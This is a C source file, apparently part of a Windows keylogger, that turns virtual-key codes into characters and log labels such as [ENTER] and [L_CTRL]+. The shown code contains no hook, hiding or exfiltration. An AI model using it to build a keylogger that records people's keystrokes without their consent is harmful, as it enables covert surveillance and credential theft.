#include "winkey.h"

char* VirtualKeyToChar(DWORD vkCode, DWORD scanCode)
{
    static char keyName[32];
    static WCHAR unicodeChar[2];
    BYTE keyboardState[256];

    // Obtener el estado actual del teclado (Shift, CTRL, etc.)
    if (!GetKeyboardState(keyboardState)) {
        return "";
    }

    // Traducir el codigo de la tecla a un caracter Unicode
    int lenUnicode = sizeof(unicodeChar) / sizeof(WCHAR);
    int result = ToUnicode(vkCode, scanCode, keyboardState, unicodeChar, lenUnicode, 0);
    if (result > 0) {
        // Si la conversion fue valida, convertimos el caracter Unicode (WCHAR) a un string 
        // multibyte (char *)
        unicodeChar[result] = '\0'; // string termine en nulo
        WideCharToMultiByte(CP_UTF8, 0, unicodeChar, -1, keyName, sizeof(keyName), NULL, NULL);
        return keyName;
    }
    else 
    {
        // Si no se puede traducri (Shift, Ctrl..) devolvemos un nombre descriptivo
        switch(vkCode)
        {
           case VK_SPACE:      return " "; // El espacio es imprimible, pero ToUnicode a veces no lo devuelve
            case VK_RETURN:     return "[ENTER]\n";
            case VK_TAB:        return "[TAB]";
            case VK_BACK:       return "[BACKSPACE]";
            case VK_DELETE:     return "[DELETE]";
            case VK_ESCAPE:     return "[ESCAPE]";
            case VK_SHIFT:      return ""; // Ignorar modificadores individuales
            case VK_LSHIFT:     return "";
            case VK_RSHIFT:     return "";
            case VK_CONTROL:    return "";
            case VK_LCONTROL:   return "[L_CTRL]+";
            case VK_RCONTROL:   return "[R_CTRL]+";
            case VK_MENU:       return "";
            case VK_LMENU:      return "[L_ALT]+";
            case VK_RMENU:      return "[R_ALT]+";
            case VK_LWIN:       return "[L_WIN]";
            case VK_RWIN:       return "[R_WIN]";
            case VK_CAPITAL:    return "[CAPS_LOCK]";
            case VK_NUMLOCK:    return "[NUM_LOCK]";
            case VK_LEFT:       return "[LEFT_ARROW]";
            case VK_RIGHT:      return "[RIGHT_ARROW]";
            case VK_UP:         return "[UP_ARROW]";
            case VK_DOWN:       return "[DOWN_ARROW]";
            case VK_F1:         return "[F1]";
            case VK_F2:         return "[F2]";
            case VK_F3:         return "[F3]";
            case VK_F4:         return "[F4]";
            case VK_F5:         return "[F5]";
            case VK_F6:         return "[F6]";
            case VK_F7:         return "[F7]";
            case VK_F8:         return "[F8]";
            case VK_F9:         return "[F9]";
            case VK_F10:        return "[F10]";
            case VK_F11:        return "[F11]";
            case VK_F12:        return "[F12]";
            default:
                // Para otras teclas no imprimibles, no registramos nada
                return "";
        }
    }
}